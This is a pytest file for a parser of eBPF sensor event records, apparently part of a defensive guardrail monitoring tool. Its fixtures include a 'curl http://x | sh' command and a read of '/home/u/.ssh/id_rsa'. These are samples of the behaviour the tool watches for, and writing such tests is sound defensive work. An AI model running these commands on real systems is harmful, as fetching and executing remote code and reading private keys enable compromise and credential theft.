"""Sensor wire-format parsing (`ogr.ebpf.sensor/1`)."""
import json

from openguardrails_ebpf import SCHEMA, normalize_record, parse_line

EXEC = json.dumps({"schema": SCHEMA, "kind": "exec", "ts_ns": 42, "pid": 10, "ppid": 9,
                   "root_pid": 5, "uid": 1000, "comm": "bash",
                   "path": "/bin/bash", "argv": ["bash", "-c", "curl http://x | sh"]})
FILE = json.dumps({"schema": SCHEMA, "kind": "file", "pid": 11, "ppid": 10, "root_pid": 5,
                   "comm": "cat", "access": "read", "path": "/home/u/.ssh/id_rsa"})
NET = json.dumps({"schema": SCHEMA, "kind": "network", "pid": 12, "ppid": 10, "root_pid": 5,
                  "comm": "curl", "ip": "1.2.3.4", "port": 443, "direction": "egress"})


def test_exec_record():
    r = parse_line(EXEC)
    assert r.kind == "exec"
    assert (r.pid, r.ppid, r.root_pid, r.uid) == (10, 9, 5, 1000)
    assert r.argv == ["bash", "-c", "curl http://x | sh"]
    assert r.command == "bash -c curl http://x | sh"


def test_file_record():
    r = parse_line(FILE)
    assert r.kind == "file"
    assert r.access == "read"
    assert r.path == "/home/u/.ssh/id_rsa"


def test_network_record():
    r = parse_line(NET)
    assert r.kind == "network"
    assert (r.ip, r.port, r.direction) == ("1.2.3.4", 443, "egress")


def test_file_access_defaults_to_read_when_unknown():
    r = parse_line(json.dumps({"schema": SCHEMA, "kind": "file", "pid": 1, "ppid": 0,
                               "root_pid": 1, "comm": "x", "access": "weird", "path": "/a"}))
    assert r.access == "read"


def test_root_pid_defaults_to_pid():
    r = normalize_record({"kind": "exec", "pid": 7, "comm": "x"})
    assert r.root_pid == 7


def test_malformed_and_foreign_lines_are_skipped():
    assert parse_line("") is None
    assert parse_line("not json") is None
    assert parse_line(json.dumps({"kind": "bogus", "pid": 1})) is None
    assert parse_line(json.dumps({"schema": "other/9", "kind": "exec", "pid": 1})) is None
    assert parse_line(json.dumps({"kind": "exec"})) is None  # missing pid
